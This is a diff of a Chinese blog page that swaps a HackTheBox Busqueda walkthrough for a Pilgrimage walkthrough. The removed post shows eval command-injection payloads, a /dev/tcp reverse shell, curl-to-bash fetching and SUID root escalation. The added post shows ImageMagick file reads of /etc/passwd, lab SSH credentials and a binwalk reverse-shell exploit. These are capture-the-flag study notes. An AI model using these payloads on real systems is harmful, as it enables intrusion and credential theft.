@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="HackTheBox-Busqueda">
+    <meta name="description" content="HackTheBox-Pilgrimage">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HTB-Busqueda | wa0er</title>
+    <title>HTB-Pilgrimage | wa0er</title>
     <link rel="icon" type="image/png" href="/wa0er.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,7 +314,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HTB-Busqueda</h1>
+                    <h1 class="description center-align post-title">HTB-Pilgrimage</h1>
                 </div>
             </div>
         </div>
@@ -455,28 +455,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-15
+                    2023-10-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-31
+                    2023-11-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k&nbsp;字
+                    637&nbsp;字
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    2 分
                 </div>
                 
 
@@ -504,162 +504,91 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTB-Busqueda"><a href="#HTB-Busqueda" class="headerlink" title="HTB-Busqueda"></a>HTB-Busqueda</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现命令注入；</p>
-<p>2.命令注入反弹shell获取svc用户权限；</p>
-<p>3.Git信息泄露密码；</p>
-<p>4.<code>sudo -l</code>发现可suid提权；</p>
-<p>5.suid提权获取root权限。</p>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap，先扫端口，后扫服务</p>
-<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410160635734.png">
+                <h1 id="HTB-Pilgrimage"><a href="#HTB-Pilgrimage" class="headerlink" title="HTB-Pilgrimage"></a>HTB-Pilgrimage</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.nmap端口扫描发现git源码泄露；</p>
+<p>2.读源码发现压缩图片用的magick命令，且发现数据库文件绝对路径；</p>
+<p>3.ImageMagick LFI读取ssh账户用户名口令；</p>
+<p>4.运行pspy64发现有监视任务；</p>
+<p>5.binwalk RCE提权获取root权限。</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111005798.png"></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111425518.png"></p>
+<p>80端口开放，有域名，写入本地hosts文件</p>
+<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.219 pilgrimage.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>开放端口：22（ssh）、80（http）；域名：<code>searcher.htb</code></p>
-<p>添加域名解析记录到本地hosts文件</p>
-<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.208 searcher.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>浏览器访问</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111101520.png" style="zoom: 67%;">
 
-<p>浏览器访问<code>http://searcher.htb/</code></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410102604709.png"></p>
-<p>大致意思，是一个集成了多搜索引擎的搜索平台。</p>
-<p>第一个框（Select your engine）是个下拉框，可选择各种搜索引擎；</p>
-<p>第二个框（What do you want to search for）是想要搜索的内容；</p>
-<p>此处尝试搜索引擎选择Apple，搜索内容为123</p>
-<p>下面的选项<code>Auto redirect</code>，不勾选，搜索时会返回如下格式的链接；勾选，会重定向到指定搜索引擎</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410103511821.png"></p>
-<p>另外页面底部，可看到<code>Flask</code>框架和<code>Searchor 2.4.0</code>，所以后端是Python</p>
-<h2 id="三、命令注入"><a href="#三、命令注入" class="headerlink" title="三、命令注入"></a>三、命令注入</h2><p>搜索的同时用Burp抓包，测试发现<code>query</code>字段可能有注入，如下两张图。Sqlmap尝试post注入，无果</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171555402.png"></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171637361.png"></p>
-<p>看了一下Github上Searchor的介绍：<a target="_blank" rel="noopener" href="https://github.com/ArjunSharda/Searchor">https://github.com/ArjunSharda/Searchor</a></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411111122155.png"></p>
-<p>根据CLI（Command-Line Interface）命令，推测一下，post参数传到CLI时，拼接大概如下（此处用<code>123'</code>和<code>123"</code>测试，双引号时响应正常，单引号响应异常，所以参数值应该被单引号包裹）</p>
-<pre class="line-numbers language-none"><code class="language-none">searchor engine 'query' --copy
-例：searchor Apple '123' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>主页是一个压缩图片的功能，上传文件，点击Shrink，成功后会返回图片链接</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134544764.png"></p>
+<p>nmap扫描结果看到有git仓库</p>
+<p>用git-dumper把git仓库下载下来：<a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
+<pre class="line-numbers language-none"><code class="language-none">python3 git_dumper.py http://pilgrimage.htb/.git/ ./pilgrimage/git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>想办法在query参数位注入想要执行的命令</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://realpython.com/python-eval-function/">https://realpython.com/python-eval-function/</a></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411115221617.png"></p>
-<p>compile()函数语法：</p>
-<pre class="line-numbers language-none"><code class="language-none">compile() 用于将源代码编译为代码对象或AST模块对象。可以根据提供的模式使用exec()或eval()函数执行返回的代码对象，以构造代码对象。
-语法：compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)
+<p>主要代码如下</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007133646940.png" style="zoom: 80%;">
 
-source: 必选项，表示要编译的源代码，可以是字符串、文件或AST（Abstract Syntax Tree）对象。
-filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “&lt;string&gt;” 即可。
-mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或“single”（编译单个语句）。
-flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。
-dont_inherit: 可选项，表示是否继承sys.flags和sys.__optimizations__模块中相关选项的值。
-optimize: 可选项，指定编译器的优化级别，若设置为-1，表示使用默认优化级别。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在<code>index.php</code>看到会执行<code>/var/www/pilgrimage.htb/magick</code>，还有sqlite数据库文件<code>/var/db/pilgrimage</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134240850.png"></p>
+<h2 id="三、ImageMagick-LFI（CVE-2022-44268）"><a href="#三、ImageMagick-LFI（CVE-2022-44268）" class="headerlink" title="三、ImageMagick LFI（CVE-2022-44268）"></a>三、ImageMagick LFI（CVE-2022-44268）</h2><p>google关键字：ImageMagick poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">https://github.com/Sybil-Scan/imagemagick-lfi-poc</a></p>
+<p>用脚本生成恶意图片</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/etc/passwd" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>自己本地用python测试一下，如下</p>
-<pre class="line-numbers language-none"><code class="language-none">test = compile("import os\nos.system('id')","&lt;String&gt;","exec")
-eval(test)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134913194.png"></p>
+<p>在网站首页上传，然后用返回的链接下载</p>
+<pre class="line-numbers language-none"><code class="language-none">wget http://pilgrimage.htb/shrunk/6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410174447442.png"></p>
-<p>如图可以成功执行<code>id</code>命令</p>
-<p>那就尝试修改请求包，传递如下query值，执行<code>id</code>命令（前面<code>1'</code>和后面<code>'</code>用于闭合，中间有空格的地方用加号连接。实际测试有没有加号都可以，但前后两个<code>%2b</code>需要加，且用空格和%20替代行不通）</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('id')",'&lt;String&gt;','exec'))%2b'
+<p>再用如下命令查看图片详细信息</p>
+<pre class="line-numbers language-none"><code class="language-none">identify -verbose 6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-传到CLI后：
-searchor Apple '1' eval(compile("import os\nos.system('id')",'&lt;String&gt;','exec')) '' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>图片的部分十六进制编码如下</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135439660.png"></p>
+<p>十六进制解码：<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135515096.png"></p>
+<p>可看到读取到的<code>/etc/passwd</code>内容，其中有一个非常规用户<code>emily</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135740333.png"></p>
+<p>刚才在<code>index.php</code>看到的sqlite数据库文件<code>/var/db/pilgrimage</code>，同样用上述方法读取</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/var/db/pilgrimage" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410173619288.png"></p>
-<p>可看到有三个地方展示了回显：响应头部<code>Location</code>、响应内容<code>&lt;a&gt;</code>标签<code>href</code>值、响应内容<code>&lt;a&gt;</code>标签文本。且当前用户是<code>svc</code></p>
-<p>再用如下语句执行<code>ls</code>命令查看当前目录下内容</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('ls')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>部分关键编码如下</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140339311.png"></p>
+<p>看到有emily用户的用户名口令</p>
+<pre class="line-numbers language-none"><code class="language-none">emily
+abigchonkyboi123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410185732026.png"></p>
-<p>有<code>app.py</code>和<code>templates</code></p>
-<p>然后执行<code>cat app.py</code>命令查看<code>app.py</code>内容</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('cat+app.py')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ssh连接</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh emily@10.10.11.219<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200023303.png"></p>
-<p>URL解码得如下代码，从代码中也可以看到post传参的逻辑</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
-<span class="token keyword">from</span> searchor <span class="token keyword">import</span> Engine
-<span class="token keyword">import</span> subprocess
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140421955.png"></p>
+<h2 id="四、binwalk-RCE提权"><a href="#四、binwalk-RCE提权" class="headerlink" title="四、binwalk RCE提权"></a>四、binwalk RCE提权</h2><p>连上ssh后，在靶机运行pspy64，看到有<code>/usr/sbin/malwarescan.sh</code>脚本，另外</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141040913.png"></p>
+<blockquote>
+<p>解释命令：<code>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/</code></p>
+<p>-m：进入监视模式（monitor mode）；</p>
+<p>-e create：监视文件的创建事件；</p>
+<p>当 <code>/var/www/pilgrimage.htb/shrunk/</code> 目录中有新文件被创建时，将显示相关信息。</p>
+</blockquote>
+<p>查看<code>/usr/sbin/malwarescan.sh</code>，会把<code>/var/www/pilgrimage.htb/shrunk/</code> 目录新创建的文件用<code>binwalk</code>处理，那么就尝试看binwalk有没有可利用点</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141344752.png"></p>
+<p>查看binwalk版本</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141501172.png"></p>
+<p>google发现对应版本binwalk存在RCE</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51249">https://www.exploit-db.com/exploits/51249</a></p>
+<p>随便找一张图片wa0er.png作为输入，执行脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py wa0er.png 10.10.14.5 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<p>本地kali执行如下命令</p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898	#开启监听
+python3 -m http.server 80	#开启http服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<p>靶机执行如下命令</p>
+<pre class="line-numbers language-none"><code class="language-none">cd /var/www/pilgrimage.htb/shrunk/
+wget http://10.10.14.5/binwalk_exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        engine <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'engine'</span><span class="token punctuation">)</span>
-        query <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>
-        auto_redirect <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auto_redirect'</span><span class="token punctuation">)</span>
-        
-        <span class="token keyword">if</span> engine <span class="token keyword">in</span> Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            arg_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'searchor'</span><span class="token punctuation">,</span> <span class="token string">'search'</span><span class="token punctuation">,</span> engine<span class="token punctuation">,</span> query<span class="token punctuation">]</span>
-            r <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>arg_list<span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-            url <span class="token operator">=</span> r<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> auto_redirect <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
-                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                <span class="token keyword">return</span> url
-
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Invalid engine!"</span><span class="token punctuation">)</span>
-
-    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Something went wrong!"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>接下来尝试反弹shell</p>
-<p>攻击机开启nc监听和http服务</p>
-<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
-python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>攻击机新建一个反弹shell文件<code>rev_shell.txt</code>，内容如下</p>
-<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>Burp修改请求包query参数如下</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('curl+10.10.14.7/rev_shell.txt|bash')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>发送请求包，成功反弹shell，获取svc用户权限</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200356098.png"></p>
-<h2 id="四、Git信息泄露"><a href="#四、Git信息泄露" class="headerlink" title="四、Git信息泄露"></a>四、Git信息泄露</h2><p>查看当前目录下文件，看到有<code>.git</code>，尝试git-dump和Githack下载失败，只能硬看</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202411535.png"></p>
-<p>看到<code>config</code>文件里有用户名密码</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202439506.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">cody:jh1usoih2bkjaspwe92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>PS：后面的<code>gitea.searcher.htb</code>是个子域，加进hosts文件看了一眼，是个类似git仓库的东西，有两个用户<code>cody</code>和<code>administrator</code>，估计也是一条路线，但没过多尝试</p>
-<h2 id="五、SUID提权"><a href="#五、SUID提权" class="headerlink" title="五、SUID提权"></a>五、SUID提权</h2><p>在svc用户尝试执行<code>sudo -l</code>，发现提示需要<code>-S</code>参数输入密码</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203854475.png"></p>
-<p>执行<code>sudo -l -S</code>，尝试密码，是上面cody的密码（PS：在HackTheBox遇见好几次这种张冠李戴的事…）</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203820884.png"></p>
-<p>可看到有一条命令可以以root身份执行，sudo执行该命令</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410204703295.png"></p>
-<p>提示三个用法，前两个是查看docker容器的相关信息，用处不大，第三个尝试会报错，如下</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205015580.png"></p>
-<p>想看一下<code>/opt/scripts/system-checkup.py</code>，没权限，就用<code>find</code>命令模糊查找<code>full-checkup</code>，发现有<code>/opt/scripts/full-checkup.sh</code>，但svc用户没有可写权限没法更改，那就尝试在当前目录<code>/home/svc</code>新建一个同名文件</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411151914512.png"></p>
-<p>靶机shell环境不方便编辑文件，我们在攻击机创建<code>full-checkup.sh</code>，内容如下</p>
-<pre class="line-numbers language-none"><code class="language-none">#!/bin/bash
-chmod +s /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>然后在靶机用<code>wget</code>把<code>full-checkup.sh</code>传过来，并添加可执行权限（注意需在<code>/home/svc</code>目录下操作，别的目录无可写权限）</p>
-<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/full-checkup.sh
-chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205810653.png"></p>
-<p>再次执行<code>full-checkup</code>选项，可看到<code>/bin/bash</code>已成功设置suid</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205833873.png"></p>
-<p>执行<code>bash -p</code>成功获取root权限</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205918651.png"></p>
+<p>成功反弹shell，获取root权限</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007143747196.png"></p>
 <p>Over！</p>
-<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411181759774.png" style="zoom: 80%;">
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438">https://blog.csdn.net/qq_58869808/article/details/130050438</a></p>
-
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007154416524.png" style="zoom:67%;">
                 
             </div>
             <hr/>
@@ -685,7 +614,7 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wa0er.github.io/posts/d91931aa.html">https://wa0er.github.io/posts/d91931aa.html</a>
+                    <a href="https://wa0er.github.io/posts/3e4c0ff8.html">https://wa0er.github.io/posts/3e4c0ff8.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1232,30 +1161,34 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/7761233f.html">
+                <a href="/posts/1e9a0fae.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/Cerberus.png" class="responsive-img" alt="HTB-Cerberus">
+                        <img src="/medias/article_cover/Log4j2.png" class="responsive-img" alt="Log4j2（CVE-2021-44228）漏洞复现及原理思考">
                         
-                        <span class="card-title">HTB-Cerberus</span>
+                        <span class="card-title">Log4j2（CVE-2021-44228）漏洞复现及原理思考</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            HackTheBox-Cerberus
+                            Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-21
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
-                                    靶机
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/" class="post-category">
+                                    细读经典
                                 </a>
                             
                             
@@ -1265,8 +1198,16 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HackTheBox/">
-                        <span class="chip bg-color">HackTheBox</span>
+                    <a href="/tags/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/">
+                        <span class="chip bg-color">细读经典</span>
+                    </a>
+                    
+                    <a href="/tags/Log4j2/">
+                        <span class="chip bg-color">Log4j2</span>
+                    </a>
+                    
+                    <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">JNDI注入</span>
                     </a>
                     
                 </div>
@@ -1280,23 +1221,23 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/9681db2a.html">
+                <a href="/posts/ec5f74de.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/Shoppy.png" class="responsive-img" alt="HTB-Shoppy">
+                        <img src="/medias/article_cover/Format.png" class="responsive-img" alt="HTB-Format">
                         
-                        <span class="card-title">HTB-Shoppy</span>
+                        <span class="card-title">HTB-Format</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            HackTheBox-Shoppy
+                            HackTheBox-Format
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-06
                             </span>
                         <span class="publish-author">
                             
